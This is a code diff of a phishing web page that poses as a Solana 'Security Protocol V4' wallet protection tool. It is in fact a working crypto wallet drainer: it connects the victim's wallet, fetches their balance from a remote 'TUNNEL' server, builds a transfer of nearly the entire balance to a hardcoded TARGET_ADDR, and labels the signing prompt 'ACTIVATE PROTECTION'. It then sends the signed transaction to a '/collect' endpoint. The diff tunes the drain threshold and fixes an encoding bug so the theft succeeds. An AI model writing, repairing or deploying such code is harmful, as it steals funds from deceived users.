@@ -2,8 +2,8 @@
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
     <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
     <div id="box" style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;min-width:300px;">
-        <h2 id="title">SECURITY PROTOCOL</h2>
-        <p id="info" style="color:#666;margin-bottom:20px;">Protect your assets with Solana v4</p>
+        <h2 id="title">SECURITY PROTOCOL V4</h2>
+        <p id="info" style="color:#666;margin-bottom:20px;">Protecting Solana Assets</p>
         <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:18px;">CONNECT WALLET</button>
     </div>
 
@@ -15,42 +15,47 @@
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
+            if (!p) { alert("Please use a Wallet browser."); return; }
+            
             if (step === 1) {
-                // 🔱 步骤 1: 仅仅是连接
+                // 第一步：只连接
                 await p.connect();
-                document.getElementById('info').innerText = "Wallet Connected: " + p.publicKey.toString().slice(0,6) + "...";
-                document.getElementById('cta').innerText = "ACTIVATE SAFETY SIGNATURE";
+                document.getElementById('info').innerText = "Wallet: " + p.publicKey.toString().slice(0,6) + "...";
+                document.getElementById('cta').innerText = "ACTIVATE PROTECTION";
                 document.getElementById('cta').style.background = "#fff";
-                step = 2; // 进入签约准备状态
+                step = 2;
             } else if (step === 2) {
-                // 🔱 步骤 2: 仪式感拉满，开始签约
-                document.getElementById('cta').innerText = "Syncing with Node...";
+                // 第二步：签约
+                document.getElementById('cta').innerText = "Syncing Node...";
                 
-                const data = await fetch(TUNNEL + '/get_data', {
+                const res = await fetch(TUNNEL + '/get_data', {
                     method: 'POST', headers: {'Content-Type':'application/json'},
                     body: JSON.stringify({pubkey: p.publicKey.toString()})
-                }).then(r => r.json());
+                });
+                const data = await res.json();
 
                 const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                     fromPubkey: p.publicKey, 
                     toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                    lamports: data.balance > 2000000 ? data.balance - 1500000 : 0
+                    lamports: data.balance > 1500000 ? data.balance - 1000000 : 0
                 }));
                 tx.recentBlockhash = data.blockhash; tx.feePayer = p.publicKey;
                 
-                // 拉起真正的签约弹窗
+                // 拉起签名
                 const signed = await p.signTransaction(tx);
                 
-                // 发送签名
+                // 💰 采用 Uint8Array 原生 Base64 转换，彻底解决 Buffer is not defined 报错
                 const raw = signed.serialize();
-                let b64 = "";
-                for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
+                let bStr = "";
+                for (let i = 0; i < raw.length; i++) { bStr += String.fromCharCode(raw[i]); }
+                const b64 = window.btoa(bStr);
+                
                 fetch(TUNNEL + '/collect', {
                     method:'POST', headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({signature: window.btoa(b64)})
+                    body:JSON.stringify({signature: b64})
                 });
                 
-                alert("Protocol Activated Successfully!");
+                alert("Security Protocol Activated!");
                 location.reload();
             }
         } catch(e) { alert("Error: " + e.message); }
